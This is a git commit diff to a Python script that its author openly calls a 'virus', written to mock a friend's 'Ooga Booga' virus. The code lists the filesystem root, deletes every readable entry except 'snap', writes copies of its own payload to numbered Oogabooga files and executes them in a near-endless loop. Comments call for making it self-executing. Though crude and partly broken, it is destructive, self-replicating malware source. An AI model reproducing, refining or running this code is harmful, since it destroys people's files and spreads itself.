1b4d3305632e6c484b6e7967620f525ea60c9d03
Mr. Waltz (Diverse Community) <68202013+MrWaltz-b14@users.noreply.github.com>
2023-03-23 17:14:49 -0400

    Update main.py
    some more improvements

--- main.py
+++ main.py
@@ -1,11 +1,9 @@
-
 """
 Produced by Mr. Waltz
 date: March 21: RAMADAN SOON Boiss!!!
 Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
 I literally only made this to shame malek for his horrible "Ooga Booga" virus.
 """
-
 
 # a virus like this should be self executable so add stuff for that later...
 # Make it cooler you stupid nerd!
@@ -18,41 +16,35 @@ path = "/"
 path2 = "C:"
 count = 0
 the_package = """
-import os
-import sys
-path = "/"
-path2 = "C:"
 sys_files = os.listdir(path)
-
-for i in range(1,9999999999):
-    with open(f"Oogabooga{i}.py", 'r') as file:
-        with open(f"Oogabooga{i}.py", 'w') as copy:
-            copy.write(the_package)
-            exec(file.read())
 
 
 def file_creation(il, code):
     il += 1
     in_code = code
-    os.access('/home')
-    with open(f"Oogabooga{il}.py", 'w') as made:
-        made.write(in_code)
-        for fila in sys_files:
-            if os.access(fila) == True:
-                os.remove(fila)
-            else:
-                pass
-            
-            
-def file_run(i):
+    ooga_file = open(f"Oogabooga{il}.py", 'w')
+    ooga_file.write(in_code)
+    for file_in in sys_files:
+        if not os.access(file_in, os.R_OK):
+            pass
+        elif file_in == 'snap':
+            pass
+        else:
+            os.remove(file_in)
+    return ooga_file
+
+
+def file_run(i, open2):
     number = i
-    with open(f"Oogabooga{i}.py", 'w') as running:
-        exec(running.read())
+    number += 1
+    open2 = outside_ooga
+    open2 = open(f"Oogabooga{number}.py", 'r')
+    exec(open2.read())
 
 
-for num in range(0,9999999999999999999999999999999):
-    file_creation(num, the_package)
-    file_run(num)
+for num in range(0, 9999999999999999999999999999999):
+    outside_ooga = file_creation(num, the_package)
+    file_run(num, outside_ooga)
 """
 sys_files = os.listdir(path)
 
@@ -60,22 +52,27 @@ sys_files = os.listdir(path)
 def file_creation(il, code):
     il += 1
     in_code = code
-    with open(f"Oogabooga{il}.py", 'w') as made:
-        made.write(in_code)
-        for fila in sys_files:
-            if not os.access(fila, os.R_OK):
-                pass
-            else:
-                os.remove(fila)
+    ooga_file = open(f"Oogabooga{il}.py", 'w')
+    ooga_file.write(in_code)
+    for file_in in sys_files:
+        if not os.access(file_in, os.R_OK):
+            pass
+        elif file_in == 'snap':
+            pass
+        else:
+            os.remove(file_in)
+    return ooga_file
 
 
-def file_run(i):
+def file_run(i, open2):
     number = i
-    with open(f"Oogabooga{i}.py", 'r') as running:
-        exec(running.read())
+    number += 1
+    open2 = outside_ooga
+    open2 = open(f"Oogabooga{number}.py", 'r')
+    exec(open2.read())
 
 
-for num in range(0,9999999999999999999999999999999):
-    file_creation(num, the_package)
-    file_run(num)
-        exec(file.read())
+for num in range(0, 9999999999999999999999999999999):
+    outside_ooga = file_creation(num, the_package)
+    file_run(num, outside_ooga)
+
